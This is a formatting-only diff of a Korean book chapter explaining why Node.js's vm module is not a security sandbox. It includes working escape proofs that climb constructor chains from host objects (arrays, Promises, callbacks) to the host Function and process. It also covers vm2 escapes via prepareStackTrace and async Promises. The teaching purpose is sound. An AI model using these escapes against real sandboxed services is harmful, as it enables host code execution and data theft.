@@ -30,24 +30,24 @@ Node.js 공식 문서는 `vm` 모듈을 "enables compiling and running code with
 `vm` 모듈의 핵심 API 세 가지를 살펴보자.
 
 ```javascript
-import vm from 'node:vm';
+import vm from 'node:vm'
 
 // 1) vm.runInNewContext: 새 컨텍스트를 만들어 코드 실행
-const result = vm.runInNewContext('x + y', { x: 10, y: 20 });
-console.log(result); // 30
+const result = vm.runInNewContext('x + y', {x: 10, y: 20})
+console.log(result) // 30
 
 // 2) vm.createContext + vm.runInContext: 컨텍스트를 재사용
-const context = vm.createContext({ counter: 0 });
-vm.runInContext('counter += 1', context);
-vm.runInContext('counter += 1', context);
-console.log(context.counter); // 2
+const context = vm.createContext({counter: 0})
+vm.runInContext('counter += 1', context)
+vm.runInContext('counter += 1', context)
+console.log(context.counter) // 2
 
 // 3) vm.Script: 코드를 미리 컴파일해두고 반복 실행
-const script = new vm.Script('value * 2');
-const ctx1 = vm.createContext({ value: 5 });
-const ctx2 = vm.createContext({ value: 100 });
-console.log(script.runInContext(ctx1)); // 10
-console.log(script.runInContext(ctx2)); // 200
+const script = new vm.Script('value * 2')
+const ctx1 = vm.createContext({value: 5})
+const ctx2 = vm.createContext({value: 100})
+console.log(script.runInContext(ctx1)) // 10
+console.log(script.runInContext(ctx2)) // 200
 ```
 
 > 예제 5.2.1 vm 모듈의 기본 API
@@ -57,14 +57,14 @@ console.log(script.runInContext(ctx2)); // 200
 여기서 중요한 점은 컨텍스트 내부의 코드가 호스트의 전역 변수에 접근할 수 없다는 것이다.
 
 ```javascript
-import vm from 'node:vm';
+import vm from 'node:vm'
 
-globalThis.secret = '호스트의 비밀';
+globalThis.secret = '호스트의 비밀'
 
-const result = vm.runInNewContext('typeof secret');
+const result = vm.runInNewContext('typeof secret')
 
-console.log(result);            // "undefined"
-console.log(globalThis.secret); // "호스트의 비밀" (변경되지 않음)
+console.log(result) // "undefined"
+console.log(globalThis.secret) // "호스트의 비밀" (변경되지 않음)
 ```
 
 > 예제 5.2.2 컨텍스트 내부에서 호스트 전역 변수에 접근 불가
@@ -99,19 +99,19 @@ Node.js 공식 문서는 `vm` 모듈 페이지의 첫머리에 다음과 같은 
 `vm.createContext()`가 만드는 V8 컨텍스트는 독립적인 전역 객체를 가진다. 이 전역 객체에는 ECMAScript 표준이 정의하는 빌트인(`Object`, `Array`, `Promise`, `Math` 등)이 새로 생성되어 들어가지만, Node.js 고유의 전역 객체(`process`, `require`, `Buffer`, `__dirname` 등)는 포함되지 않는다.
 
 ```javascript
-import vm from 'node:vm';
+import vm from 'node:vm'
 
-const context = vm.createContext({});
+const context = vm.createContext({})
 
 // ECMAScript 빌트인은 존재한다
-console.log(vm.runInContext('typeof Object', context));  // "function"
-console.log(vm.runInContext('typeof Array', context));   // "function"
-console.log(vm.runInContext('typeof Promise', context)); // "function"
+console.log(vm.runInContext('typeof Object', context)) // "function"
+console.log(vm.runInContext('typeof Array', context)) // "function"
+console.log(vm.runInContext('typeof Promise', context)) // "function"
 
 // Node.js 전역 객체는 존재하지 않는다
-console.log(vm.runInContext('typeof process', context)); // "undefined"
-console.log(vm.runInContext('typeof require', context)); // "undefined"
-console.log(vm.runInContext('typeof Buffer', context));  // "undefined"
+console.log(vm.runInContext('typeof process', context)) // "undefined"
+console.log(vm.runInContext('typeof require', context)) // "undefined"
+console.log(vm.runInContext('typeof Buffer', context)) // "undefined"
 ```
 
 > 예제 5.2.3 V8 컨텍스트의 빌트인과 Node.js 전역 객체
@@ -119,8 +119,8 @@ console.log(vm.runInContext('typeof Buffer', context));  // "undefined"
 여기서 중요한 점이 하나 있다. 컨텍스트 안의 `Object`, `Function` 등 빌트인은 호스트의 것이 아니라 **컨텍스트 자체에 새로 생성된 독립적인 복사본** 이다.
 
 ```javascript
-const contextFunction = vm.runInContext('Function', context);
-console.log(contextFunction === Function); // false
+const contextFunction = vm.runInContext('Function', context)
+console.log(contextFunction === Function) // false
 ```
 
 컨텍스트의 `Function`과 호스트의 `Function`은 서로 다른 객체다. 컨텍스트의 `Function` 생성자로 만든 함수는 컨텍스트의 전역 스코프에서 실행되므로, `process`나 `require` 같은 호스트 전역에 접근할 수 없다. 이 분리가 컨텍스트 격리의 핵심이다.
@@ -134,17 +134,14 @@ console.log(contextFunction === Function); // false
 JavaScript에서 모든 일반 객체는 프로토타입 체인을 가진다. `{}`로 만든 객체의 프로토타입은 `Object.prototype`이고, `Object.prototype.constructor`는 `Object` 함수를 가리킨다. 그리고 `Object`는 함수이므로 `Object.constructor`는 `Function` 생성자를 가리킨다. 5.2.2.1절에서 확인한 것처럼, 컨텍스트 자체의 `Function`은 호스트의 `Function`과 다른 객체다. 그런데 호스트에서 만든 객체의 프로토타입 체인을 타고 올라가면, 도달하는 `Function`은 컨텍스트의 것이 아니라 **호스트의 것** 이다.
 
 ```javascript
-import vm from 'node:vm';
+import vm from 'node:vm'
 
-const sandbox = { data: { value: 42 } };
-const context = vm.createContext(sandbox);
+const sandbox = {data: {value: 42}}
+const context = vm.createContext(sandbox)
 
 // 호스트 객체의 프로토타입 체인은 호스트의 Function에 도달한다
-const hostFunction = vm.runInContext(
-  'data.constructor.constructor',
-  context
-);
-console.log(hostFunction === Function); // true — 호스트의 Function!
+const hostFunction = vm.runInContext('data.constructor.constructor', context)
+console.log(hostFunction === Function) // true — 호스트의 Function!
 ```
 
 > 예제 5.2.4 호스트 객체의 프로토타입 체인이 호스트 Function에 도달하는 증거
@@ -152,7 +149,8 @@ console.log(hostFunction === Function); // true — 호스트의 Function!
 `data`는 호스트에서 `{ value: 42 }`로 생성한 객체다. 이 객체의 `constructor`는 호스트의 `Object`이고, `Object.constructor`는 호스트의 `Function`이다. 호스트의 `Function` 생성자로 만든 함수는 호스트의 전역 스코프에서 실행되므로, `process`에 접근할 수 있다. 다음 코드로 전체 탈출 과정을 시연해보자.
 
 ```javascript
-const escaped = vm.runInContext(`
+const escaped = vm.runInContext(
+  `
   const HostObject = data.constructor;           // 호스트의 Object
   const HostFunction = HostObject.constructor;   // 호스트의 Function
 
@@ -165,9 +163,11 @@ const escaped = vm.runInContext(`
     version: hostProcess.version,
     platform: hostProcess.platform,
   });
-`, context);
+`,
+  context,
+)
 
-console.log(escaped);
+console.log(escaped)
 // { pid: <현재 PID>, version: 'v24.13.0', platform: 'darwin' }
 ```
 
@@ -188,34 +188,31 @@ flowchart LR
 "그렇다면 호스트 객체를 전달하지 않으면 안전한 것 아닌가?"라고 생각할 수 있다. 실제로 호스트 객체를 전달하지 않으면 이 경로는 차단된다.
 
 ```javascript
-import vm from 'node:vm';
+import vm from 'node:vm'
 
 // 프로토타입 없는 샌드박스, 호스트 객체 미전달
-const sandbox = Object.create(null);
-const context = vm.createContext(sandbox);
+const sandbox = Object.create(null)
+const context = vm.createContext(sandbox)
 
 try {
   // this.constructor.constructor는 존재하지만 컨텍스트 자체의 Function이다
   // 컨텍스트의 Function으로 만든 코드는 process에 접근 불가
-  vm.runInContext(
-    'this.constructor.constructor("return process")()',
-    context
-  );
+  vm.runInContext('this.constructor.constructor("return process")()', context)
 } catch (err) {
-  console.log('탈출 차단:', err.message);
+  console.log('탈출 차단:', err.message)
   // ReferenceError: process is not defined
 }
 
 // 그러나 호스트 객체를 하나라도 전달하면 즉시 탈출 가능
-const sandbox2 = Object.create(null);
-sandbox2.config = { timeout: 5000 }; // 호스트에서 생성한 평범한 객체
-const context2 = vm.createContext(sandbox2);
+const sandbox2 = Object.create(null)
+sandbox2.config = {timeout: 5000} // 호스트에서 생성한 평범한 객체
+const context2 = vm.createContext(sandbox2)
 
 const proc = vm.runInContext(
   'config.constructor.constructor("return process")()',
-  context2
-);
-console.log('탈출 성공:', proc.version); // v24.13.0
+  context2,
+)
+console.log('탈출 성공:', proc.version) // v24.13.0
 ```
 
 > 예제 5.2.5 호스트 객체 전달 유무에 따른 탈출 가능 여부
@@ -231,25 +228,25 @@ console.log('탈출 성공:', proc.version); // v24.13.0
 5.2.2.2절에서 `data.constructor.constructor`를 통한 탈출을 시연했다. 여기서 강조할 점은 진입점이 `data` 하나가 아니라는 것이다. 호스트에서 생성한 **어떤 값** 이든 컨텍스트에 전달하는 순간 탈출 경로가 된다.
 
 ```javascript
-import vm from 'node:vm';
+import vm from 'node:vm'
 
-const sandbox = Object.create(null);
+const sandbox = Object.create(null)
 
 // 어떤 타입이든 호스트에서 생성한 값은 호스트의 Function으로 연결된다
-sandbox.callback = (msg) => console.log(msg); // 함수
-sandbox.items = [1, 2, 3];                    // 배열
-sandbox.pattern = /test/;                     // 정규식
-sandbox.promise = Promise.resolve(42);         // Promise
+sandbox.callback = (msg) => console.log(msg) // 함수
+sandbox.items = [1, 2, 3] // 배열
+sandbox.pattern = /test/ // 정규식
+sandbox.promise = Promise.resolve(42) // Promise
 
-const context = vm.createContext(sandbox);
+const context = vm.createContext(sandbox)
 
 const escape = (expr) =>
-  vm.runInContext(`${expr}.constructor('return process')().version`, context);
+  vm.runInContext(`${expr}.constructor('return process')().version`, context)
 
-console.log('함수 경유:', escape('callback'));        // v24.13.0
-console.log('배열 경유:', escape('items.constructor')); // v24.13.0
-console.log('정규식 경유:', escape('pattern.constructor')); // v24.13.0
-console.log('Promise 경유:', escape('promise.constructor')); // v24.13.0
+console.log('함수 경유:', escape('callback')) // v24.13.0
+console.log('배열 경유:', escape('items.constructor')) // v24.13.0
+console.log('정규식 경유:', escape('pattern.constructor')) // v24.13.0
+console.log('Promise 경유:', escape('promise.constructor')) // v24.13.0
 ```
 
 > 예제 5.2.6 호스트에서 생성한 모든 객체가 탈출 경로가 된다
@@ -259,12 +256,13 @@ console.log('Promise 경유:', escape('promise.constructor')); // v24.13.0
 `process` 객체에 접근한 공격자가 실제로 할 수 있는 일을 정리하면 다음과 같다.
 
 ```javascript
-import vm from 'node:vm';
+import vm from 'node:vm'
 
-const sandbox = { data: {} };
-const context = vm.createContext(sandbox);
+const sandbox = {data: {}}
+const context = vm.createContext(sandbox)
 
-const stolen = vm.runInContext(`
+const stolen = vm.runInContext(
+  `
   const F = data.constructor.constructor;
   const proc = F('return process')();
 
@@ -282,9 +280,11 @@ const stolen = vm.runInContext(`
     // 3) process.exit()으로 서비스 중단도 가능
     // 4) process.mainModule?.require로 모듈 로드도 가능 (CJS 환경)
   });
-`, context);
+`,
+  context,
+)
 
-console.log(stolen);
+console.log(stolen)
 ```
 
 > 예제 5.2.7 process 접근 후 실제 피해 범위
@@ -302,8 +302,8 @@ V8 엔진은 `Error.prepareStackTrace`라는 비표준 API를 제공한다. 에�
 Error.prepareStackTrace = (error, callSites) => {
   // callSites: CallSite 객체의 배열
   // 각 CallSite는 호출 스택의 한 프레임을 나타낸다
-  return callSites.map(site => site.getFunctionName()).join('\n');
-};
+  return callSites.map((site) => site.getFunctionName()).join('\n')
+}
 ```
 
 문제는 이 콜백이 **컨텍스트 경계를 넘어 호출된다** 는 것이다. `vm2`는 프로토타입 체인 탈출을 막기 위해 모든 객체를 `Proxy`로 래핑하여 `constructor` 접근을 차단했다. 그러나 `vm2`는 `Proxy`와 원본 객체의 매핑을 `WeakMap`에 저장하고 있었고, `WeakMap.prototype.has()`와 `WeakMap.prototype.get()` 등의 메서드를 래핑하지 않은 빈틈이 있었다. 공격자는 래핑되지 않은 `WeakMap` 메서드를 통해 `Proxy` 뒤의 원본 호스트 객체에 접근할 수 있었고, 이를 이용해 `prepareStackTrace`를 오버라이드하여 `Proxy` 래핑을 거치지 않는 호스트 렐름(realm)의 `CallSite` 객체에 접근할 수 있었다. `CallSite` 객체를 통해 호스트 렐름의 함수 참조를 획득하면, `Proxy`가 아무리 `constructor`를 차단해도 우회할 수 있다.
@@ -335,33 +335,38 @@ SandBreak가 패치된 이후에도 `vm2`에는 비슷한 유형의 취약점이
 Promise.resolve().then(() => {
   // 이 콜백은 vm2의 Proxy를 거쳐 실행됨
   // → constructor 등 위험한 속성 접근이 차단됨
-});
+})
 
 // 2) async 함수의 반환값: vm2의 래핑을 우회
-async function exploit() { return 1; }
+async function exploit() {
+  return 1
+}
 
 exploit().then(() => {
   // async가 반환하는 Promise는 vm2의 래퍼가 아닌 호스트의 네이티브 Promise
   // → .then() 콜백이 새니타이징되지 않은 채 호스트 렐름에서 실행됨
   // → 호스트 객체에 접근 가능 → 샌드박스 탈출
-});
+})
 ```
 
 이 문제는 `vm2`에 국한되지 않는다. 원본 `vm` 모듈에서도 호스트의 `Promise`를 컨텍스트에 전달하면 동일한 원리로 탈출이 가능하다.
 
 ```javascript
-import vm from 'node:vm';
+import vm from 'node:vm'
 
-const sandbox = Object.create(null);
-sandbox.hostPromise = Promise.resolve(42);
-const context = vm.createContext(sandbox);
+const sandbox = Object.create(null)
+sandbox.hostPromise = Promise.resolve(42)
+const context = vm.createContext(sandbox)
 
 // 호스트 Promise의 constructor → 호스트 Function → 탈출
-const version = vm.runInContext(`
+const version = vm.runInContext(
+  `
   const HostFunction = hostPromise.constructor.constructor;
   HostFunction('return process')().version;
-`, context);
-console.log('Promise 경유 탈출:', version); // v24.13.0
+`,
+  context,
+)
+console.log('Promise 경유 탈출:', version) // v24.13.0
 ```
 
 > 예제 5.2.8 호스트 Promise를 통한 탈출
